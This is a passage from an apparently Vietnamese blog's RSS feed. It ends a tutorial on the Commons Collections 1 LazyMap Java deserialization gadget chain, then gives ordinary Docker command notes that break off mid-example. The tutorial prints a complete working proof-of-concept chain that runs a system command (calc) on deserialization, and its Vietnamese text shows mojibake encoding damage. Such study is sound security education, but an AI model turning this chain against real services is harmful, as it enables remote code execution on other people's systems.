class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihProxyObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(aihProxyObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/ChuoiHoanChinh.png"></p><p>MÃ¡y tÃ­nh Ä‘Ã£ báº­t lÃªn vÃ  chuá»—i cá»§a chÃºng ta Ä‘Ã£ Ä‘Æ°á»£c xÃ¢y dá»±ng thÃ nh cÃ´ng~</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lá»i káº¿t"></a>Lá»i káº¿t</h2><p>Proxy Ä‘á»™ng lÃ  má»™t kiáº¿n thá»©c khÃ¡ phá»©c táº¡p vá»›i nhá»¯ng báº¡n má»›i báº¯t Ä‘áº§u, mÃ¬nh khuyÃªn cÃ¡c báº¡n chá»‰ cáº§n há»c vÃ  hiá»ƒu cÃ¡ch sá»­ dá»¥ng, Ä‘á»«ng Ä‘Ã o sÃ¢u vÃ o code gá»‘c bá»Ÿi vÃ¬ Ä‘Ã³ lÃ  má»™t lÆ°á»£ng kiáº¿n thá»©c lá»›n do nhá»¯ng ngÆ°á»i Ä‘i trÆ°á»›c Ä‘Ã£ viáº¿t ra.<br>Khi khá»Ÿi táº¡o Proxy Ä‘á»™ng cáº§n Ä‘áº¿n class loader cÃ¡c báº¡n chá»‰ cáº§n biáº¿t táº£i lá»›p nÃ o cáº§n class loader nÃ o lÃ  Ä‘á»§ hoáº·c cá»© cho Ä‘áº¡i null, khÃ´ng Ä‘Ãºng thÃ¬ abc.class.getClassLoader(), khÃ´ng cáº§n tÃ¬m hiá»ƒu sÃ¢u vÃ o nÃ³.</p><blockquote><p>ChÃºc cÃ¡c báº¡n há»c tá»‘t~</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Deserialization/">Deserialization</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://rayinaw.github.io/tags/Commons-Collections/">Commons Collections</category>
      
      
      <comments>https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Má»™t báº£n ghi chÃ©p nhá» vá» Docker</title>
      <link>https://rayinaw.github.io/2022/12/03/docker-learning/</link>
      <guid>https://rayinaw.github.io/2022/12/03/docker-learning/</guid>
      <pubDate>Fri, 02 Dec 2022 18:13:09 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Docker-Command-Line&quot;&gt;&lt;a href=&quot;#Docker-Command-Line&quot; class=&quot;headerlink&quot; title=&quot;Docker Command Line&quot;&gt;&lt;/a&gt;Docker Command Line&lt;/h1&gt;&lt;h2 i</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Docker-Command-Line"><a href="#Docker-Command-Line" class="headerlink" title="Docker Command Line"></a>Docker Command Line</h1><h2 id="Thao-tac-voi-moi-lan-chay"><a href="#Thao-tac-voi-moi-lan-chay" class="headerlink" title="Thao tÃ¡c vá»›i má»—i láº§n cháº¡y:"></a>Thao tÃ¡c vá»›i má»—i láº§n cháº¡y:</h2><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> busybox:1.24 <span class="built_in">echo</span> <span class="string">&quot;hello world!&quot;</span></span></span><br><span class="line"></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> busybox:1.24 <span class="built_in">ls</span> /</span></span><br></pre></td></tr></table></figure><h2 id="i-va-t-flag"><a href="#i-va-t-flag" class="headerlink" title="-i vÃ  -t flag:"></a>-i vÃ  -t flag:</h2><p>Flag -i dÃ¹ng Ä‘á»ƒ má»Ÿ má»™t tÆ°Æ¡ng tÃ¡c vá»›i container, giá»¯ cho nÃ³ tiáº¿p tá»¥c Ä‘Æ°á»£c má»Ÿ Ä‘á»ƒ thá»±c thi nhá»¯ng tÃ¡c vá»¥ tiáº¿p.<br>Flag -t dÃ¹ng Ä‘á»ƒ táº¡o má»™t pseudo-TTY(TTY tÆ°Æ¡ng tá»± nhÆ° shell command trong linux), cÃ³ nghÄ©a lÃ  táº¡o má»™t shell cá»§a image rá»“i gáº¯n vÃ o terminal cá»§a mÃ¬nh.</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -i -t busybox:1.24</span></span><br><span class="line">hay</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it busybox:1.24</span></span><br><span class="line">Káº¿t quáº£:</span><br><span class="line">&gt; docker <span class="keyword">run</span><span class="language-bash"> -it busybox:1.24</span></span><br><span class="line">/ <span class="comment"># ls</span></span><br><span class="line">bin   dev   etc   home  proc  root  sys   tmp   usr   var</span><br></pre></td></tr></table></figure><h2 id="Docker-container-va-d-flag"><a href="#Docker-container-va-d-flag" class="headerlink" title="Docker container vÃ  -d flag:"></a>Docker container vÃ  -d flag:</h2><p>Khi cháº¡y má»™t cÃ¡ch bÃ¬nh thÆ°á»ng, nÃ³ sáº½ thá»±c thi lá»‡nh trá»±c tiáº¿p trÃªn terminal cá»§a chÃºng ta (run container in foreground). NhÆ°ng náº¿u chÃºng ta muá»‘n nÃ³ khÃ´ng cháº¡y trÃªn terminal mÃ  cháº¡y á»Ÿ trong container (run container in background).<br>VÃ­ dá»¥ khi cháº¡y lá»‡nh sleep 1000:</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KhÃ´ng cháº¡y vá»›i tag -d:</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash">  busybox:1.24 <span class="built_in">sleep</span> 1000</span></span><br><span class="line">nÃ³ sáº½ sleep trá»±c tiáº¿p trÃªn terminal(má»Ÿ terminal má»›i Ä‘i bro :P)</span><br><span class="line">Cháº¡y vá»›i tag -d:</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -d busybox:1.24 <span class="built_in">sleep</span> 1000</span></span><br><span class="line">&gt; docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND        CREATED         STATUS         PORTS     NAMES</span><br><span class="line"><span class="number">4</span>b69615931bb   busybox:<span class="number">1.24</span>   <span class="string">&quot;sleep 1000&quot;</span>   <span class="number">7</span> seconds ago   Up <span class="number">6</span> seconds             eloquent_newton</span><br></pre></td></tr></table></figure><p>Äá»ƒ xem container Ä‘ang cháº¡y gÃµ <code>docker ps</code>(cháº¡y trong background hoáº·c trÃªn terminal), vá»›i container Ä‘Ã£ dá»«ng gÃµ <code>docker ps -a</code>.<br>Äá»ƒ khÃ´ng lÆ°u láº¡i container khi káº¿t thÃºc docker container chÃºng ta dÃ¹ng tag â€“rm, khi Ä‘Ã³ náº¿u quy trÃ¬nh káº¿t thÃºc, docker sáº½ tá»± Ä‘á»™ng xÃ³a container mÃ  khÃ´ng lÆ°u vÃ o <code>docker ps -a</code>.</p><h2 id="â€“name-flag"><a href="#â€“name-flag" class="headerlink" title="â€“name flag:"></a>â€“name flag:</h2><p>Äáº·t tÃªn cho container má»—i láº§n cháº¡y.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name hello_world busybox:1.24</span><br></pre></td></tr></table></figure><h2 id="p-flag"><a href="#p-flag" class="headerlink" title="-p flag:"></a>-p flag:</h2><p><code>-p host_port:container_port</code> : map cá»•ng cá»§a container sang cá»•ng mÃ¡y tháº­t. ChÃºng ta cÃ³ thá»ƒ map nhiá»u cáº·p port má»™t láº§n báº±ng cÃ¡ch viáº¿t liÃªn tiáº¿p nhá»¯ng cáº·p Ä‘Ã³ <code>-p 8888:8080 80:4444</code>.<br>VÃ­ dá»¥ vá»›i tomcat server, tomcat lÃ  má»™t open source web server thá»±c thi Java servlet. Tomcat image nÃ y cháº¡y á»Ÿ port 8080:</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -p 8888:8080 tomcat:8.0</span></span><br></pre></td></tr></table></figure><p>Äá»£i má»™t lÃ¡t Ä‘á»ƒ nÃ³ pull tomcat:8.0 vá».<br>Sau khi táº£i xong truy cáº­p <a href="http://localhost:8888/">http://localhost:8888/</a> trÃªn browser. Tomcat Ä‘Ã£ cháº¡y trÃªn port 8888.<br>MÃ¬nh sáº½ giáº£i thÃ­ch má»™t chÃºt:</p><ul><li>Tomcat nÃ y lÃ  má»™t container (xem nhÆ° lÃ  má»™t mÃ¡y áº£o cho dá»… hÃ¬nh dung nhÆ°ng háº§u nhÆ° khÃ´ng pháº£i nhÃ© ^^), nÃ³ cháº¡y trÃªn port 8080 cá»§a mÃ¡y chá»§ tomcat nÃ y.</li><li>Sau khi map qua cá»•ng cá»§a localhost, cá»•ng 8888 bÃ¢y giá» sáº½ nhÆ° lÃ  cá»•ng 8080 cá»§a mÃ¡y chá»§ tomcat váº­y.</li></ul><h2 id="Docker-log"><a href="#Docker-log" class="headerlink" title="Docker log:"></a>Docker log:</h2><p>Khi cháº¡y má»™t server qua terminal, nháº­t kÃ­ sáº½ Ä‘Æ°á»£c ghi láº¡i trá»±c tiáº¿p á»Ÿ trÃªn terminal. Khi cháº¡y server qua container background Ä‘á»ƒ xem nháº­t kÃ­ cá»§a server chÃºng ta sá»­ dá»¥ng cÃ¢u lá»‡nh <code>docker logs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; docker run -it -d -p 8888:8080 tomcat:8.0</span><br><span class="line">4cc4583095b59189adaa0dc202944d5cdd5968df403584a84b26d6e57c585bd7</span><br><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker logs 4cc4583095b59189adaa0dc202944d5cdd5968df403584a84b26d6e57c585bd7</span><br><span class="line">Using CATALINA_BASE:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_HOME:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_TMPDIR: /usr/local/tomcat/temp</span><br><span class="line">Using JRE_HOME:        /docker-java-home/jre</span><br><span class="line">......pháº§n log á»Ÿ dÆ°á»›i dÃ i nÃªn mÃ¬nh cáº¯t......</span><br><span class="line">Hoáº·c láº¥y id tá»« docker ps rá»“i docker logs &lt;id&gt;</span><br></pre></td></tr></table></figure><h2 id="Docker-pull"><a href="#Docker-pull" class="headerlink" title="Docker pull:"></a>Docker pull:</h2><p>CÃ¢u lá»‡nh nÃ y dÃ¹ng Ä‘á»ƒ láº¥y image tá»« trÃªn hub cá»§a docker vá». VÃ­ dá»¥:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:lastest</span><br><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><h2 id="Docker-commit"><a href="#Docker-commit" class="headerlink" title="Docker commit:"></a>Docker commit:</h2><p>Lá»‡nh <code>docker commit</code> dÃ¹ng Ä‘á»ƒ lÆ°u nhá»¯ng thay Ä‘á»•i trong file system cá»§a má»™t Docker container vÃ o image má»›i.<br>Syntax: <code>docker commit container_id repository_name:tag</code></p><h2 id="Docker-build-command"><a href="#Docker-build-command" class="headerlink" title="Docker build command"></a>Docker build command</h2><p>CÃ¢u lá»‡nh <code>docker build</code> dÃ¹ng Ä‘á»ƒ build má»™t image tá»« má»™t Dockerfile vÃ  context (nÆ¡i chá»©a nhá»¯ng thá»© nhÆ° file php, java,â€¦ cáº§n dÃ¹ng Ä‘á»ƒ build). Hai thá»© nÃ y Ä‘Æ°á»£c chá»©a trong cÃ¹ng má»™t folder, chÃºng ta gáº¯n URL hoáº·c path Ä‘á»ƒ chá»‰ cho docker biáº¿t nÆ¡i chá»©a 2 cÃ¡i nÃ y.<br>Systax:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH</span><br><span class="line">VÃ­ dá»¥:</span><br><span class="line">docker build -t image_name .</span><br></pre></td></tr></table></figure><ul><li>-t flag dÃ¹ng Ä‘á»ƒ Ä‘áº·t tÃªn cho image.</li><li>Dáº¥u <code>.</code> Ä‘á»ƒ nÃ³i cho docker biáº¿t lÃ  tÃ¬m Dockerfile á»Ÿ thÆ° má»¥c hiá»‡n táº¡i, Ä‘Ã¢y lÃ  path dáº«n Ä‘áº¿n Dockerfile.</li></ul><h2 id="Docker-inspect"><a href="#Docker-inspect" class="headerlink" title="Docker inspect:"></a>Docker inspect:</h2><p>MÃ´ táº£ thÃ´ng tin low level cá»§a má»™t container hay image.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; docker run -d busybox:1.24 sleep 100</span><br><span class="line">0c06e0155702fcb6dc7969eac63f68d74f5781dbc6960461ee88dc3c15942ea9</span><br><span class="line">pwn@DESKTOP-AC6UABE:pts/4-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker inspect 0c06e0155702fcb6dc7969eac63f68d74f5781dbc6960461ee88dc3c15942ea9</span><br></pre></td></tr></table></figure><h2 id="Go-Image-va-Container"><a href="#Go-Image-va-Container" class="headerlink" title="Gá»¡ Image vÃ  Container:"></a>Gá»¡ Image vÃ  Container:</h2><h3 id="Go-container"><a href="#Go-container" class="headerlink" title="Gá»¡ container:"></a>Gá»¡ container:</h3><ul><li>Äáº§u tiÃªn pháº£i dá»«ng container Ä‘ang cháº¡y: <code>docker stop &lt;id container&gt;</code></li><li>GÃµ <code>docker ps -a</code> Ä‘á»ƒ xem container Ä‘Ã£ dá»«ng.</li><li><code>docker rm -f &lt;id container Ä‘Ã£ dá»«ng&gt;</code>, -f flag á»Ÿ Ä‘Ã¢y lÃ  cá» báº¯t buá»™c gá»¡, nÃªn xÃ i Ä‘á»ƒ gá»¡ thuáº­n tiá»‡n hÆ¡n.</li></ul><h3 id="Go-image"><a href="#Go-image" class="headerlink" title="Gá»¡ image:"></a>Gá»¡ image:</h3><ul><li><code>docker rmi &lt;tÃªn image&gt;</code></li></ul><h1 id="Docker-Containerâ€™s-Filesystem"><a href="#Docker-Containerâ€™s-Filesystem" class="headerlink" title="Docker Containerâ€™s Filesystem"></a>Docker Containerâ€™s Filesystem</h1><h2 id="Docker-images-va-layers"><a href="#Docker-images-va-layers" class="headerlink" title="Docker images vÃ  layers:"></a>Docker images vÃ  layers:</h2><p>Má»™t Docker images Ä‘Æ°á»£c xÃ¢y dá»±ng tá»« nhá»¯ng layer. Má»—i layer Ä‘áº¡i diá»‡n cho má»—i lá»‡nh trong Dockerfile, hay khi cháº¡y lá»‡nh báº±ng cÃ¡ch build thÃ´ng qua Docker Commint Command á»Ÿ pháº§n sau.<br>Má»—i cÃ¢u lá»‡nh cÃ³ thay Ä‘á»•i file cá»§a má»™t container Ä‘á»u táº¡o ra má»™t layer má»›i. Äá»ƒ dá»… hÃ¬nh dung chÃºng ta cÃ¹ng Ä‘i qua vÃ­ dá»¥ sau(Láº¥y tá»« docs.docker.com):</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> org.opencontainers.image.authors=<span class="string">&quot;org@example.com&quot;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -r <span class="variable">$HOME</span>/.cache</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> python /app/app.py</span></span><br></pre></td></tr></table></figure><p>Khi cháº¡y file trÃªn, nÃ³ sáº½ táº¡o ra má»™t Docker image má»›i cÃ³ cáº¥u hÃ¬nh theo cÃ¡c cÃ¢u lá»‡nh Ä‘Æ°á»£c cháº¡y á»Ÿ file trÃªn. CÃ¢u lá»‡nh LABEL khÃ´ng liÃªn quan Ä‘áº¿n file há»‡ thá»‘ng. CÃ¢u lá»‡nh COPY thÃªm file á»Ÿ thÆ° má»¥c chá»©a Dockerfile vÃ o thÆ° má»¥c &#x2F;app cá»§a container. Tuy nhiÃªn nÃ³ chá»‰ COPY trong quÃ¡ trÃ¬nh cháº¡y, Ä‘á»ƒ viáº¿t thay Ä‘á»•i Ä‘Ã³ vÃ o layer cá»§a má»™t image má»›i chÃºng ta cáº§n cháº¡y lá»‡nh <code>RUN make /app</code>, khi nÃ y má»™t layer má»›i má»›i Ä‘Æ°á»£c táº¡o. <code>RUN rm -r $HOME/.cache</code> gá»¡ thÆ° má»¥c cache, cÃ¢u lá»‡nh RUN nÃ y sáº½ táº¡o ra má»™t layer má»›i. CÃ¢u lá»‡nh CMD cuá»‘i cÃ¹ng chá»‰ Ä‘á»ƒ cháº¡y command python khi container Ä‘ang cháº¡y vÃ  khÃ´ng táº¡o layer má»›i.</p><p>Äá»ƒ xem cÃ¡c layers cá»§a má»™t image chÃºng ta dÃ¹ng lá»‡nh <code>docker image history &lt;id&gt;</code></p><h2 id="Docker-container-va-writable-layer"><a href="#Docker-container-va-writable-layer" class="headerlink" title="Docker container vÃ  writable layer:"></a>Docker container vÃ  writable layer:</h2><p>Docker container Ä‘Æ°á»£c táº¡o tá»« nhá»¯ng docker image chá»‰ Ä‘á»c hay khÃ´ng thay Ä‘á»•i Ä‘Æ°á»£c. Má»™t docker container Ä‘Æ°á»£c táº¡o tá»« má»™t image sáº½ cÃ³ thÃªm má»™t lá»›p á»Ÿ trÃªn, lá»›p nÃ y Ä‘Æ°á»£c gá»i lÃ  <code>writable layer</code>hay <code>container layer</code>. Má»i thay Ä‘á»•i trong container nÃ y sáº½ Ä‘Æ°á»£c lÆ°u vÃ o lá»›p nÃ y.</p><p>Khi nghiÃªn cá»©u tá»›i Ä‘Ã¢y, mÃ¬nh cÃ³ má»™t tháº¯c máº¯c lÃ  nhÆ° Ä‘Ã£ nÃ³i, khi táº¡o má»™t container viá»‡c thay Ä‘á»•i trong container nÃ y chá»‰ thay Ä‘á»•i lá»›p writable, rá»“i má»™t image lÃ  khÃ´ng thay Ä‘á»•i Ä‘Æ°á»£c váº­y thÃ¬ táº¡i sao chÃºng ta cÃ³ thá»ƒ thay Ä‘á»•i file há»‡ thá»‘ng khi cháº¡y container?. Theo mÃ¬nh hiá»ƒu thÃ¬ nÃ³ nhÆ° nÃ y:</p><ul><li>Khi chÃºng ta táº¡o má»™t container, nÃ³ nhÆ° lÃ  má»™t mÃ¡y má»›i Ä‘Æ°á»£c táº¡o ra váº­y, chÃºng ta cÃ³ thá»ƒ thay Ä‘á»•i cÃ¡c file, folder trong mÃ¡y má»›i nÃ y. NÃ³ sáº½ khÃ´ng áº£nh hÆ°á»Ÿng gÃ¬ Ä‘áº¿n cÃ¡c image cáº£ vÃ¬ nÃ³ riÃªng biá»‡t mÃ .</li><li>Tháº¿ rá»“i writable Ä‘Ã³ Ä‘á»ƒ lÃ m gÃ¬? Khi thay Ä‘á»•i má»™t container cháº¡y tá»« má»™t image rá»“i lÆ°u láº¡i thÃ nh má»™t image má»›i, ngÆ°á»i ta sáº½ lÆ°u láº¡i quy trÃ¬nh theo tá»«ng bÆ°á»›c khiáº¿n file há»‡ thá»‘ng bá»‹ thay Ä‘á»•i Ä‘á»ƒ táº¡o quÃ¡ trÃ¬nh build image má»›i nÃ y cÃ³ trÃ¬nh tá»±, vÃ  cháº¯c cÅ©ng dá»… dÃ ng hÆ¡n. VÃ  khi nÃ y nhá»¯ng bÆ°á»›c thay Ä‘á»•i Ä‘Ã³ sáº½ Ä‘Æ°á»£c lÆ°u xuá»‘ng lá»›p writable, náº¿u chÃºng ta commit thay Ä‘á»•i nÃ y, nhá»¯ng cÃ¡i thay Ä‘á»•i thá»±c hiá»‡n ghi láº¡i trong lá»›p writable nÃ y sáº½ Ä‘Æ°á»£c lÆ°u láº¡i theo nhá»¯ng layer má»›i xáº¿p chá»“ng lÃªn nhá»¯ng layer cá»§a image cÅ©.</li></ul><h1 id="Cach-build-mot-Docker-image"><a href="#Cach-build-mot-Docker-image" class="headerlink" title="CÃ¡ch build má»™t Docker image:"></a>CÃ¡ch build má»™t Docker image:</h1><p>CÃ³ hai cÃ¡ch Ä‘á»ƒ build má»™t docker image:</p><ul><li>Commit nhá»¯ng cÃ¡i Ä‘Ã£ build, thay Ä‘á»•i trong má»™t Docker container vÃ o má»™t image má»›i.</li><li>Viáº¿t má»™t Dockerfile.<br>BÃ¢y giá» chÃºng ta cÃ¹ng Ä‘i cá»¥ thá»ƒ vÃ o tá»«ng cÃ¡ch Ä‘á»ƒ build má»™t docker image.</li></ul><h2 id="Build-Docker-Images-by-using-Docker-Commit-Command"><a href="#Build-Docker-Images-by-using-Docker-Commit-Command" class="headerlink" title="Build Docker Images by using Docker Commit Command:"></a>Build Docker Images by using Docker Commit Command:</h2><p>Giáº£ sá»­ chÃºng ta chÃºng ta cÃ³ má»™t base image lÃ  má»™t debian (há»‡ Ä‘iá»u hÃ nh tÆ°Æ¡ng tá»± linux), khi run image nÃ y nÃ³ khÃ´ng cÃ³ Git command. BÃ¢y giá» Ä‘á»ƒ thuáº­n tiá»‡n hÆ¡n chÃºng ta táº¡o má»™t image má»›i cÃ³ cÃ i sáºµn Git dá»±a trÃªn debian image kia Ä‘á»ƒ chÃºng ta khÃ´ng pháº£i cÃ i láº¡i Git má»—i láº§n cháº¡y. Khi Ä‘Ã³ chÃºng ta cÃ³ ba bÆ°á»›c Ä‘á»ƒ thá»±c hiá»‡n nhÆ° sau:</p><ul><li><ol><li>Táº¡o má»™t container tá»« base image</li></ol></li><li><ol start="2"><li>Install Git pakage trong container.</li></ol></li><li><ol start="3"><li>Commit thay Ä‘á»•i trong container Ä‘Ã£ lÃ m.<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pull vÃ  cháº¡y debian</span></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it debian:jessie</span></span><br><span class="line"><span class="comment"># CÃ i Git cho container nÃ y</span></span><br><span class="line">apt-get update &amp;&amp; apt-get install --force-yes git</span><br><span class="line"><span class="comment"># Commit thay Ä‘á»•i, gÃµ &quot;docker ps -a&quot; Ä‘á»ƒ láº¥y id cá»§a container nÃ y.</span></span><br><span class="line">docker commit ba638bca3016 rayinaw/debian:update</span><br><span class="line"><span class="comment"># Tráº£ vá» sha256:3e6332e9ae0a1597a25d213bf42b0592e3291969259d631c3eacc893f4735171</span></span><br><span class="line">GÃµ docker images Ä‘á»ƒ tháº¥y má»™t image má»›i Ä‘Ã£ Ä‘Æ°á»£c táº¡o. Size nÃ³ lá»›n hÆ¡n debian cÅ© <span class="number">100</span> mb, lÃ  dung lÆ°á»£ng cá»§a git.</span><br><span class="line">BÃ¢y giá» cháº¡y Ä‘á»ƒ test.</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it 